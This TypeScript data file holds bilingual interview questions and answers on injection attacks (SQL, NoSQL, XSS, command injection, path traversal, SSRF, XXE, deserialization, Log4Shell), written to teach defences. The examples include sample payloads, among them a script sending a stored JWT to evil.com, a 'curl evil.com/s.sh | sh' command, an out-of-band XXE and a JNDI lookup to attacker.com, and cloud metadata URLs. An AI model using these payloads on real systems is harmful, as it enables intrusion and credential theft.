// Security & JWT — Injection & code-execution attacks
import type { PvQuestion } from '../../../types';

export const questions: PvQuestion[] = [
  {
    q: 'What is SQL injection and how do you prevent it in Java and Node?',
    difficulty: 'hard',
    a: `<div class="interview-answer"><p>SQL injection happens when user input is concatenated into a query so the input can change the query's <em>structure</em> instead of only supplying a value. The one real fix is <strong>parameterized queries</strong> (<code>PreparedStatement</code>, MyBatis <code>#{}</code>, JPA named parameters, driver placeholders) — the driver sends SQL and data separately, so no amount of quoting or escaping can turn data into code. Escaping by hand, blacklisting words, or stripping quotes all fail; and the parts a placeholder cannot cover (table names, column names, <code>ORDER BY</code>) must be validated against an allowlist. Add least-privilege DB accounts and no raw error messages so a mistake does not become a full database dump.</p></div>
<details class="viet-answer"><summary>🇻🇳 Đáp án (Tiếng Việt)</summary><p>SQL injection xảy ra khi input của người dùng bị nối thẳng vào câu SQL, khiến input đó sửa được <em>cấu trúc</em> câu truy vấn chứ không chỉ đóng vai một giá trị. Cách chữa duy nhất đúng là dùng <strong>truy vấn tham số hóa</strong> (<code>PreparedStatement</code>, MyBatis <code>#{}</code>, named parameter của JPA, placeholder của driver) — driver gửi phần SQL và phần dữ liệu riêng biệt, nên dù input có gì thì cũng không thể biến thành code. Tự escape, tự chặn từ khóa hay xóa dấu nháy đều thất bại; còn những chỗ placeholder không làm được (tên bảng, tên cột, <code>ORDER BY</code>) thì phải kiểm tra theo danh sách cho phép (allowlist). Thêm vào đó: user DB chỉ có quyền tối thiểu và không trả lỗi SQL nguyên văn ra ngoài, để một sai sót không biến thành mất cả database.</p></details>
<pre>// The vulnerability
String sql = "SELECT * FROM users WHERE email = '" + email + "'";
// email = ' OR '1'='1     → returns every user
// email = ' UNION SELECT card_no,1,1 FROM payments--  → data exfiltration
// email = '; DROP TABLE users--                       → destruction
// Blind SQLi needs no output at all:
//   ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'--
//   → true/false or response-time differences leak the data one char at a time

// The fix — data can never become SQL
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE email = ?");
ps.setString(1, email);            // driver binds it as a VALUE</pre>
<pre>// MyBatis: the single most common Java mistake
&lt;select id="find"&gt;
  SELECT * FROM users WHERE email = #{email}   &lt;!-- ✅ bound parameter --&gt;
  SELECT * FROM users WHERE email = '\${email}' &lt;!-- ❌ string substitution --&gt;
&lt;/select&gt;
// \${} is literal text interpolation. Only use it for identifiers you
// validated yourself, never for user input.

// JPA / Hibernate
em.createQuery("FROM User u WHERE u.email = :email")   // ✅
  .setParameter("email", email);
em.createQuery("FROM User u WHERE u.email = '" + email + "'"); // ❌ JPQL injection

// Node (pg / mysql2)
db.query('SELECT * FROM users WHERE email = $1', [email]);      // ✅
db.query(\`SELECT * FROM users WHERE email = '\${email}'\`);       // ❌</pre>
<p><strong>The cases placeholders cannot solve</strong> — dynamic sorting and dynamic table names. Map them, do not interpolate them:</p>
<pre>const SORTABLE = { name: 'name', created: 'created_at' };   // allowlist
const col = SORTABLE[req.query.sort] ?? 'created_at';
const dir = req.query.dir === 'asc' ? 'ASC' : 'DESC';
db.query(\`SELECT * FROM items ORDER BY \${col} \${dir} LIMIT $1\`, [limit]);
// Values from a fixed map are safe; raw req.query never is.</pre>
<p><strong>Defense in depth:</strong> the app's DB user should have no DDL and no access to tables it does not need; stored procedures are not automatically safe (dynamic SQL inside them injects too); ORMs are safe only until someone reaches for a raw query; a WAF blocks noisy payloads but never replaces parameterization; and NoSQL is not immune — see the operator-injection question below.</p>
<div class="key-point">Never build SQL by concatenation. Parameterize every value, allowlist every identifier, run the app on a least-privilege DB account, and hide database errors from users — SQLi has been in the OWASP Top 10 for twenty years because concatenation feels convenient.</div>`,
  },
  {
    q: 'Can NoSQL and ORM layers be injected too?',
    difficulty: 'medium',
    a: `<div class="interview-answer"><p>Yes — injection is about untrusted input changing the meaning of a query, which is not specific to SQL. In MongoDB, a JSON body that contains operators turns a lookup into a tautology: <code>{"password": {"$gt": ""}}</code> matches any password, and <code>$where</code> or <code>$function</code> can execute JavaScript on the server. The same class of bug appears in JPQL string concatenation, LDAP filters, XPath, GraphQL filter passthrough, and Elasticsearch query bodies. The fix is the same everywhere: validate the <em>type and shape</em> of input (a password must be a string, not an object), never pass a raw request body into a query builder, and use the driver's parameter binding.</p></div>
<details class="viet-answer"><summary>🇻🇳 Đáp án (Tiếng Việt)</summary><p>Có — bản chất injection là input không tin cậy làm đổi ý nghĩa của câu truy vấn, chuyện đó không riêng gì SQL. Với MongoDB, một body JSON chứa toán tử sẽ biến phép kiểm tra thành luôn-đúng: <code>{"password": {"\$gt": ""}}</code> khớp với mọi mật khẩu, còn <code>\$where</code> hay <code>\$function</code> thì chạy được cả JavaScript trên server. Cùng loại lỗi đó xuất hiện ở JPQL nối chuỗi, ở LDAP filter, XPath, GraphQL cho truyền thẳng filter xuống, hay body query của Elasticsearch. Cách chữa ở đâu cũng giống nhau: kiểm tra <em>kiểu và hình dạng</em> của input (mật khẩu phải là string, không được là object), không bao giờ đưa nguyên request body vào query builder, và dùng cơ chế bind tham số của driver.</p></details>
<pre>// ❌ Mongo authentication bypass — no password needed
app.post('/login', async (req, res) => {
  const user = await User.findOne({
    email: req.body.email,
    password: req.body.password,     // ← body is trusted as a query fragment
  });
});
// POST {"email":"admin@x.com","password":{"$ne":null}}  → logs in as admin
// POST {"email":{"$regex":"^a"}}                        → enumerate users

// ✅ Force the types before they reach the query
const { email, password } = z.object({
  email: z.string().email(),
  password: z.string().min(8),      // an object now fails validation
}).parse(req.body);
const user = await User.findOne({ email });      // then verify the hash
const ok = await argon2.verify(user.passwordHash, password);</pre>
<pre>// Other flavours of the same bug
// JPQL (Java)
em.createQuery("FROM User WHERE name = '" + name + "'");   // ❌ injectable
// LDAP filter
"(uid=" + username + ")"    // username = *)(uid=*  → filter bypass
// → use escaping/parameterized filters (Spring LdapQueryBuilder)
// GraphQL: passing a client-supplied "where" object straight to the ORM
//   lets the client filter by columns it should never touch
// Elasticsearch: string-concatenated query_string with user input</pre>
<p><strong>Practical hardening:</strong> enable strict schema validation at the edge (zod/Joi, Bean Validation + DTOs), reject unexpected keys, disable Mongo's <code>$where</code>/server-side JS, use <code>express-mongo-sanitize</code> or Mongoose's strict casting, and never build ORM criteria directly from query strings.</p>
<div class="key-point">Injection is a data-becomes-code problem, not a SQL problem. Anywhere untrusted input reaches a query language — Mongo operators, JPQL, LDAP, XPath, GraphQL filters — validate types and shape first, and let the driver bind parameters.</div>`,
  },
  {
    q: 'What is XSS and why does it matter for token-based auth?',
    difficulty: 'hard',
    a: `<div class="interview-answer"><p>XSS is when an attacker runs their JavaScript inside the page's origin, so it can do anything the page's own code can do, including reading the DOM, making authenticated requests, and stealing any token reachable from JavaScript. This is the main argument against storing tokens in localStorage, since XSS drains it instantly, while an HttpOnly cookie is at least hidden from scripts. Even so, XSS can still act as the user through an HttpOnly cookie by making requests directly. The real fix is prevention through output encoding, treating input as untrusted, a strict Content-Security-Policy, and framework auto-escaping.</p></div>
<details class="viet-answer"><summary>🇻🇳 Đáp án (Tiếng Việt)</summary><p>XSS là khi kẻ tấn công chèn được JavaScript của họ và chạy nó ngay trong origin của trang. Đoạn script đó làm được mọi việc mà code của chính trang làm được: đọc DOM, gọi API với danh nghĩa người dùng, và lấy bất kỳ token nào JavaScript với tới được. Đây là lý do chính không nên để token trong localStorage — bị XSS là mất token ngay; cookie HttpOnly thì ít nhất script không đọc được. Dù vậy, kể cả với cookie HttpOnly, script vẫn có thể tự gửi request thay người dùng vì trình duyệt tự động kèm cookie. Cách chữa gốc là phòng XSS: escape dữ liệu khi render, coi mọi input là không đáng tin, đặt <code>Content-Security-Policy</code> chặt, và dựa vào cơ chế auto-escape của framework.</p></details>
<p><strong>XSS (Cross-Site Scripting)</strong>: An attacker injects malicious JavaScript that runs in your page with full access to everything the page can access.</p>
<pre>// Three types:
1. Stored XSS: malicious script saved in DB, served to all users
   Comment: &lt;script&gt;fetch('evil.com?token='+localStorage.getItem('jwt'))&lt;/script&gt;

2. Reflected XSS: malicious script in URL parameter
   https://myapp.com/search?q=&lt;script&gt;alert('hacked')&lt;/script&gt;

3. DOM-based XSS: script manipulates DOM unsafely
   document.innerHTML = userInput;  // DANGEROUS!</pre>
<p><strong>Impact on auth:</strong></p>
<pre>// If token is in localStorage:
localStorage.getItem('accessToken')  // attacker reads it!
fetch('https://evil.com/steal?token=' + token)  // sends to attacker

// If token is in HttpOnly cookie:
document.cookie  // can't read HttpOnly cookies ✅
// BUT attacker can still make requests AS the user from the page</pre>
<p><strong>Prevention:</strong></p>
<ul>
<li><strong>Output encoding</strong>: escape user content before rendering in HTML</li>
<li><strong>CSP headers</strong>: <code>Content-Security-Policy: script-src 'self'</code></li>
<li><strong>Framework safe rendering</strong>: React auto-escapes by default, Angular sanitizes</li>
<li><strong>Never use</strong>: <code>innerHTML</code>, <code>dangerouslySetInnerHTML</code>, <code>eval()</code> with user input</li>
</ul>
<div class="key-point">Even with HttpOnly cookies, XSS can act AS the user (make API calls, change data). XSS prevention is critical regardless of token storage strategy.</div>`,
  },
  {
    q: 'What are command injection and path traversal, and how do you prevent them?',
    difficulty: 'hard',
    a: `<div class="interview-answer"><p>Both come from passing user input to an API that interprets it as more than data. <strong>Command injection</strong> happens when input reaches a shell — <code>Runtime.exec("convert " + file)</code> or <code>child_process.exec</code> — where <code>;</code>, <code>|</code>, <code>&amp;&amp;</code> and backticks start new commands. The fix is to never invoke a shell: pass an argument array (<code>ProcessBuilder</code>, <code>execFile</code>/<code>spawn</code>) so the input is one opaque argument, and prefer a library over shelling out. <strong>Path traversal</strong> is the file-system version: <code>../../etc/passwd</code> or an absolute path escapes the intended directory, so you must canonicalize the resolved path and verify it still starts with the base directory — filtering the string <code>..</code> is not enough because of URL/Unicode encodings.</p></div>
<details class="viet-answer"><summary>🇻🇳 Đáp án (Tiếng Việt)</summary><p>Cả hai đều xuất phát từ việc đưa input của người dùng vào một API coi nó là nhiều hơn dữ liệu. <strong>Command injection</strong> xảy ra khi input đi tới shell — kiểu <code>Runtime.exec("convert " + file)</code> hay <code>child_process.exec</code> — vì ở đó <code>;</code>, <code>|</code>, <code>&amp;&amp;</code> và dấu backtick sẽ mở ra câu lệnh mới. Cách chữa là đừng gọi shell: truyền tham số dạng mảng (<code>ProcessBuilder</code>, <code>execFile</code>/<code>spawn</code>) để input chỉ là một argument đơn thuần, và tốt nhất là dùng thư viện thay vì gọi lệnh hệ thống. <strong>Path traversal</strong> là phiên bản trên hệ thống file: <code>../../etc/passwd</code> hoặc một đường dẫn tuyệt đối sẽ thoát ra khỏi thư mục dự kiến, nên phải chuẩn hóa (canonicalize) đường dẫn sau khi resolve rồi kiểm tra nó có còn nằm trong thư mục gốc hay không — chỉ chặn chuỗi <code>..</code> là không đủ, vì còn URL-encode và Unicode.</p></details>
<pre>// ❌ Command injection
Runtime.getRuntime().exec("ping -c 1 " + host);
// host = "8.8.8.8; curl evil.com/s.sh | sh"
exec(\`git clone \${repoUrl}\`);            // Node: exec() spawns a shell

// ✅ No shell, arguments stay arguments
new ProcessBuilder("ping", "-c", "1", host).start();   // Java
execFile('git', ['clone', repoUrl]);                   // Node
// Plus: allowlist the input format (a hostname regex), drop privileges,
// set a timeout, and prefer a library (JGit, ImageMagick bindings).</pre>
<pre>// ❌ Path traversal
File f = new File("/var/uploads/" + req.getParameter("name"));
// name = "../../../../etc/passwd"  or  "..%2f..%2fetc%2fpasswd"
res.sendFile(path.join(UPLOADS, req.params.file));   // same bug in Node

// ✅ Resolve, then verify containment
Path base = Paths.get("/var/uploads").toRealPath();
Path target = base.resolve(userName).normalize().toRealPath();
if (!target.startsWith(base)) throw new SecurityException("traversal");

const target = path.resolve(UPLOADS, userFile);
if (!target.startsWith(path.resolve(UPLOADS) + path.sep)) throw new Error();
// Better still: never accept a filename — accept an ID and look up the
// stored path in the database.</pre>
<p><strong>Related variants worth naming:</strong> <em>Zip Slip</em> (an archive entry named <code>../../app.jar</code> overwrites files during extraction — validate every entry path before writing); symlink attacks (use <code>toRealPath()</code>/<code>O_NOFOLLOW</code>); template injection (SSTI) when user input is rendered as a template; and "argument injection", where input that starts with <code>--</code> becomes a flag (<code>--upload-file</code> in curl) even without a shell.</p>
<div class="key-point">Never build a shell command or a file path by concatenation. Pass arguments as an array, resolve paths and assert they stay under the base directory, prefer IDs over filenames, and validate archive entries before extraction.</div>`,
  },
  {
    q: 'What is SSRF and why is it so dangerous in the cloud?',
    difficulty: 'hard',
    a: `<div class="interview-answer"><p><strong>SSRF</strong> (Server-Side Request Forgery) is when an attacker controls a URL that your server fetches, turning your backend into a proxy inside your own network. It is severe in the cloud because the server can reach things the attacker cannot: internal admin endpoints, databases, Kubernetes APIs, and above all the instance metadata service at <code>169.254.169.254</code>, which hands out temporary IAM credentials — that is how the Capital One breach happened. Blacklisting "localhost" is not a defense: attackers use decimal IPs, IPv6, redirects, and DNS names that resolve to internal addresses. The real controls are a strict allowlist of destinations, resolving the DNS name and validating the resulting IP before connecting, blocking redirects, using IMDSv2, and putting outbound egress rules in front of the service.</p></div>
<details class="viet-answer"><summary>🇻🇳 Đáp án (Tiếng Việt)</summary><p><strong>SSRF</strong> là khi kẻ tấn công điều khiển được URL mà server của bạn đi gọi, biến backend thành một cái proxy nằm sẵn bên trong mạng nội bộ. Trên cloud thì cực nguy hiểm, vì server chạm được những thứ kẻ tấn công không chạm được: endpoint admin nội bộ, database, Kubernetes API, và nhất là instance metadata ở <code>169.254.169.254</code> — nơi trả về IAM credential tạm thời, đúng kiểu đã gây ra vụ Capital One. Chặn chuỗi "localhost" không phải là phòng thủ: người ta dùng IP dạng thập phân, IPv6, redirect, hoặc tên miền trỏ về địa chỉ nội bộ. Biện pháp thật sự là: allowlist các đích được phép gọi, resolve DNS rồi kiểm tra chính IP thu được trước khi kết nối, không cho đi theo redirect, bật IMDSv2, và đặt rule chặn egress ở tầng hạ tầng.</p></details>
<pre>// The vulnerable feature is always something innocent:
POST /api/preview   { "url": "https://example.com/logo.png" }
POST /api/webhook   { "callbackUrl": "..." }
POST /api/import    { "feed": "..." }

// Attacker payloads
http://169.254.169.254/latest/meta-data/iam/security-credentials/  ← AWS keys
http://metadata.google.internal/computeMetadata/v1/  (GCP)
http://localhost:8080/actuator/env        ← Spring secrets
http://10.0.0.5:6379/  + Redis protocol smuggling
file:///etc/passwd     gopher://  dict://  ← non-HTTP schemes
http://2130706433/  http://[::1]/  http://127.0.0.1.nip.io/  ← filter bypass
http://evil.com/redirect → 302 → http://169.254.169.254/  ← redirect bypass</pre>
<pre>// Defense: validate the resolved IP, not the string
const u = new URL(input);
if (!['http:', 'https:'].includes(u.protocol)) throw new Error('scheme');
if (!ALLOWED_HOSTS.has(u.hostname)) throw new Error('host');   // best control
const { address } = await dns.lookup(u.hostname);
if (isPrivate(address)) throw new Error('internal target');
// isPrivate: 127/8, 10/8, 172.16/12, 192.168/16, 169.254/16, ::1, fc00::/7
await fetch(u, { redirect: 'manual', signal: AbortSignal.timeout(5000) });
// Note the TOCTOU risk: DNS can change between check and connect
// (DNS rebinding) — pin the validated IP for the actual connection.</pre>
<p><strong>Layered controls seniors mention:</strong> route all outbound user-driven fetches through a dedicated egress proxy with an allowlist; run the fetching service in a subnet with no route to metadata or internal services; require IMDSv2 (token-based, so a simple GET is not enough); never reflect the fetched response verbatim (blind SSRF is still exploitable via timing and error differences); and treat <em>any</em> user-supplied URL — including image URLs, PDF generators, and XML/SVG parsers — as an SSRF vector.</p>
<div class="key-point">SSRF converts "fetch this URL" into access to your internal network and cloud credentials. Allowlist destinations, validate the resolved IP (not the hostname string), forbid redirects and non-HTTP schemes, enforce IMDSv2, and block egress at the network layer.</div>`,
  },
  {
    q: 'What is XXE and how do you configure Java XML parsers safely?',
    difficulty: 'hard',
    a: `<div class="interview-answer"><p><strong>XXE</strong> (XML External Entity) abuses a legacy XML feature: a document can declare an entity that the parser resolves by reading a file or a URL. If a service parses untrusted XML with default settings, an attacker can read <code>/etc/passwd</code>, reach internal endpoints (SSRF via XML), or exhaust memory with the "billion laughs" expansion. It is mostly a Java/.NET problem because many older Java parsers resolve DTDs by default, and it hides in SOAP endpoints, SAML assertions, XLSX/DOCX uploads, and SVG files. The fix is one line per parser: disable DTDs entirely (<code>disallow-doctype-decl</code>), or switch to a format that has no entity concept.</p></div>
<details class="viet-answer"><summary>🇻🇳 Đáp án (Tiếng Việt)</summary><p><strong>XXE</strong> lợi dụng một tính năng cũ của XML: một tài liệu có thể khai báo entity, và parser sẽ resolve entity đó bằng cách đọc file hoặc gọi URL. Nếu service parse XML không tin cậy với cấu hình mặc định, kẻ tấn công có thể đọc <code>/etc/passwd</code>, gọi tới endpoint nội bộ (SSRF qua XML), hoặc làm cạn RAM bằng đòn "billion laughs". Đây phần lớn là vấn đề của Java/.NET vì nhiều parser Java cũ mặc định vẫn resolve DTD, và nó thường ẩn trong các endpoint SOAP, SAML assertion, file XLSX/DOCX upload lên, hay file SVG. Cách chữa chỉ là một dòng cấu hình cho mỗi parser: tắt hoàn toàn DTD (<code>disallow-doctype-decl</code>), hoặc chuyển sang định dạng không có khái niệm entity.</p></details>
<pre>&lt;!-- File disclosure --&gt;
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE r [ &lt;!ENTITY x SYSTEM "file:///etc/passwd"&gt; ]&gt;
&lt;r&gt;&amp;x;&lt;/r&gt;         &lt;!-- the response echoes the file contents --&gt;

&lt;!-- SSRF / cloud credential theft --&gt;
&lt;!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;

&lt;!-- Billion laughs: exponential entity expansion → OOM DoS --&gt;
&lt;!ENTITY a "dos"&gt;&lt;!ENTITY b "&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;"&gt;
&lt;!ENTITY c "&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;"&gt; ... (×10 levels)

&lt;!-- Blind/out-of-band XXE: no output needed, data leaves via DNS/HTTP --&gt;
&lt;!ENTITY % p SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % go SYSTEM "http://evil.com/?d=%p;"&gt;</pre>
<pre>// Java — the safe baseline for every parser you create
DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();
f.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
f.setFeature("http://xml.org/sax/features/external-general-entities", false);
f.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
f.setXIncludeAware(false);
f.setExpandEntityReferences(false);

// SAXParserFactory / XMLInputFactory / TransformerFactory / SchemaFactory
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
// Spring: prefer Jackson XML with DTD support off; check libraries that
// parse XML for you (Apache POI, Batik/SVG, SAML libs, old SOAP stacks).</pre>
<p><strong>Interview follow-ups:</strong> why is JSON not affected? (no entity/DTD concept — though <em>YAML</em> has its own equivalent in unsafe deserialization and anchors); how do you find XXE? (any endpoint accepting <code>Content-Type: application/xml</code>, or file uploads that are secretly ZIP-of-XML); and what if you need DTDs? (you almost never do — if you truly do, use a local entity resolver and never fetch remote resources).</p>
<div class="key-point">Default XML parser settings are the vulnerability. Disable DOCTYPE declarations and external entities on every factory you construct, audit libraries that parse XML on your behalf, and remember SVG/XLSX/SAML are XML too.</div>`,
  },
  {
    q: 'What is insecure deserialization, and what is prototype pollution in JavaScript?',
    difficulty: 'tricky',
    a: `<div class="interview-answer"><p>Deserialization is dangerous when the serialized data decides which <em>types</em> get instantiated: the attacker no longer supplies values, they supply object graphs, and a "gadget chain" of classes already on the classpath can end in remote code execution. In Java that is <code>ObjectInputStream.readObject()</code> on untrusted bytes (the ysoserial gadget chains) and Jackson with polymorphic typing enabled; in Python it is <code>pickle</code>; in JavaScript there is no native equivalent, but the parallel bug is <strong>prototype pollution</strong> — a deep merge of attacker JSON containing <code>__proto__</code> mutates <code>Object.prototype</code> and changes behaviour application-wide, sometimes escalating to RCE. The rule is to never deserialize untrusted binary formats, use JSON with explicit schemas and concrete DTOs, and reject the dangerous keys.</p></div>
<details class="viet-answer"><summary>🇻🇳 Đáp án (Tiếng Việt)</summary><p>Deserialization trở nên nguy hiểm khi chính dữ liệu quyết định <em>class nào</em> được khởi tạo: kẻ tấn công không còn gửi giá trị nữa mà gửi cả một đồ thị object, và một "gadget chain" gồm các class vốn đã có trên classpath có thể dẫn tới thực thi mã từ xa. Trong Java, đó là gọi <code>ObjectInputStream.readObject()</code> trên dữ liệu không tin cậy (các gadget chain của ysoserial) và Jackson khi bật polymorphic typing; trong Python là <code>pickle</code>. JavaScript không có cơ chế tương đương, nhưng lỗi song song là <strong>prototype pollution</strong> — một phép deep-merge JSON của kẻ tấn công có chứa <code>__proto__</code> sẽ sửa <code>Object.prototype</code> và làm đổi hành vi của cả ứng dụng, có trường hợp leo thang tới RCE. Nguyên tắc: không deserialize định dạng binary từ nguồn không tin cậy, dùng JSON kèm schema rõ ràng và DTO cụ thể, đồng thời loại bỏ các key nguy hiểm.</p></details>
<pre>// ❌ Java: reading serialized objects from a request/cookie/queue
ObjectInputStream in = new ObjectInputStream(request.getInputStream());
Object o = in.readObject();          // RCE before any cast or check
// The attacker sends a chain of standard library / Commons-Collections
// objects whose readObject()/hashCode() side effects end in exec().
// A cast afterwards does NOT help — the damage happens during reading.

// ❌ Jackson polymorphic typing
mapper.enableDefaultTyping();                       // removed for a reason
@JsonTypeInfo(use = Id.CLASS)                       // attacker picks the class
// ✅ bind to a concrete DTO, keep FAIL_ON_UNKNOWN_PROPERTIES on, or use
//    @JsonTypeInfo with a closed set of named subtypes + validateSubTypes

// ✅ If Java serialization is unavoidable (legacy queues):
ObjectInputFilter.Config.createFilter("com.myapp.dto.*;!*")  // JEP 290 allowlist</pre>
<pre>// ❌ Prototype pollution — the JS equivalent
merge(config, JSON.parse(req.body));       // naive recursive merge
// body: {"__proto__": {"isAdmin": true}}
//   → ({}).isAdmin === true for EVERY object in the process
// body: {"constructor": {"prototype": {"toString": ...}}}
// Real impact: auth bypass (opts.isAdmin), DoS, and RCE when a polluted
// property reaches child_process options or a template engine.

// ✅ Defenses
if (['__proto__','constructor','prototype'].includes(key)) continue;
const safe = Object.create(null);           // no prototype to pollute
JSON.parse(text, (k, v) => k === '__proto__' ? undefined : v);
Object.freeze(Object.prototype);            // blunt but effective
// Best: validate with a schema (zod/Joi/ajv) and copy only known fields.</pre>
<p><strong>How to talk about it:</strong> name the root cause — "the data controls the code path" — then give the general fix: prefer data-only formats, validate against an explicit schema, allowlist types if polymorphism is genuinely required, keep dependencies patched (most published gadget chains come from library classes), and run the service with least privilege so RCE is not automatically game over.</p>
<div class="key-point">Never deserialize untrusted input into arbitrary types: no <code>readObject()</code> on user bytes, no default/polymorphic typing in Jackson, no naive deep merge of request JSON. Use concrete DTOs plus schema validation, and reject <code>__proto__</code>/<code>constructor</code> keys.</div>`,
  },
  {
    q: 'What was Log4Shell, and what lessons should a senior take from it?',
    difficulty: 'hard',
    a: `<div class="interview-answer"><p>Log4Shell (CVE-2021-44228) was a remote code execution bug in Log4j 2: message strings were interpolated, so logging attacker-controlled text containing <code>\${jndi:ldap://evil.com/a}</code> made the logger perform a JNDI lookup and load a remote class. It was catastrophic because the untrusted input was <em>a log line</em> — a User-Agent, a username, a filename — so nearly every Java service was reachable, often through libraries nobody knew they had. The immediate fixes were upgrading Log4j, and as stopgaps <code>log4j2.formatMsgNoLookups=true</code> or removing <code>JndiLookup</code>. The lasting lessons: know your transitive dependency tree (SBOM), be able to patch and redeploy everything in hours, block outbound egress by default, and treat logging and templating as places where injection lives.</p></div>
<details class="viet-answer"><summary>🇻🇳 Đáp án (Tiếng Việt)</summary><p>Log4Shell (CVE-2021-44228) là lỗi thực thi mã từ xa trong Log4j 2: chuỗi log được đem đi nội suy, nên chỉ cần log một đoạn text do kẻ tấn công đưa vào có chứa <code>\${jndi:ldap://evil.com/a}</code> là logger sẽ đi tra JNDI và tải một class từ xa về chạy. Nó thảm khốc vì đầu vào không tin cậy ở đây chỉ là <em>một dòng log</em> — User-Agent, username, tên file — nên hầu như mọi service Java đều bị với tới, mà thường là qua những thư viện không ai biết là mình đang dùng. Cách xử lý lúc đó là nâng cấp Log4j, tạm thời thì đặt <code>log4j2.formatMsgNoLookups=true</code> hoặc xóa class <code>JndiLookup</code>. Bài học còn lại lâu dài: phải biết rõ cây dependency gián tiếp của mình (SBOM), phải có khả năng vá và deploy lại toàn bộ hệ thống trong vài giờ, mặc định chặn traffic đi ra ngoài, và xem việc ghi log hay render template cũng là chỗ có thể bị injection.</p></details>
<pre>// The attack, in one line
GET / HTTP/1.1
User-Agent: \${jndi:ldap://attacker.com/exploit}
// → app logs the header → Log4j resolves the \${...} lookup
// → JNDI/LDAP fetch → remote class loaded and executed → shell

// Why "we don't log user input" was no defense:
// frameworks log headers, failed logins log usernames, error handlers
// log request bodies, and \${...} survives inside JSON, URLs and filenames.

// The fixes, in order of quality
1. Upgrade log4j-core to 2.17.1+ (2.3.2 / 2.12.4 for older JDKs)
2. Stopgap: -Dlog4j2.formatMsgNoLookups=true
3. Stopgap: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
4. Egress firewall: the exploit needs an OUTBOUND LDAP/HTTP call — block it</pre>
<p><strong>The transferable lessons</strong> (this is what the interviewer is really asking):</p>
<ul>
<li><strong>Inventory beats heroics</strong>: teams with an SBOM and a dependency scanner in CI answered "are we affected?" in minutes; others spent a week grepping JARs.</li>
<li><strong>Patch velocity is a security control</strong>: if you cannot rebuild and redeploy every service the same day, you do not have a response capability.</li>
<li><strong>Default-deny egress</strong> turned a critical RCE into a failed DNS lookup for many companies — outbound rules are cheap insurance.</li>
<li><strong>Transitive dependencies are your code</strong>: pin versions, use lockfiles/BOMs, and prefer fewer, better-maintained libraries.</li>
<li><strong>Features that interpolate strings are attack surface</strong>: logging, templating, spreadsheet formulas, expression languages (see also Spring4Shell and SpEL injection).</li>
</ul>
<div class="key-point">Log4Shell was RCE through a log line: any string interpolation over untrusted input is an injection point. The durable defenses are dependency inventory + fast patching + default-deny egress, not hoping your libraries are safe.</div>`,
  },
];
